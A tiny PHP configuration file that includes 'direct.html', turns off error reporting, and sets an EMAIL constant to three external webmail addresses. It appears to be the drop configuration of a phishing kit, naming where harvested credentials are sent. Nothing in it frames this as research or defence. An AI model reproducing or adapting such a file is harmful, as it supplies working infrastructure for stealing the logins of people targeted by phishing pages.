<?php
include('direct.html');
error_reporting(0);
$ur_email   = "latesayee80@seznam.cz,latesayee80000@mail.ru,latesayee8@gmail.com";
define("EMAIL", "$ur_email");
?>